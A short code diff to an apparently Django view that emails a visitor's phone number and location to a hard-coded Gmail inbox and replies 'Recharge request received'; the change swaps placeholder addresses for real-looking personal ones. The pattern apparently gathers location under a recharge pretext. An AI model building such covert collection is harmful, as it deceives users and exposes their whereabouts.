@@ -26,7 +26,7 @@ def save_location(request):
             message = f"Phone: {phone}\nLocation: {location_text}"
 
             send_mail(
-                subject, message, "your_email@gmail.com", ["your_admin@gmail.com"]
+                subject, message, "swapeatmail@gmail.com", ["piyushphysics834@gmail.com"]
             )
 
             return JsonResponse({"message": "Recharge request received"})
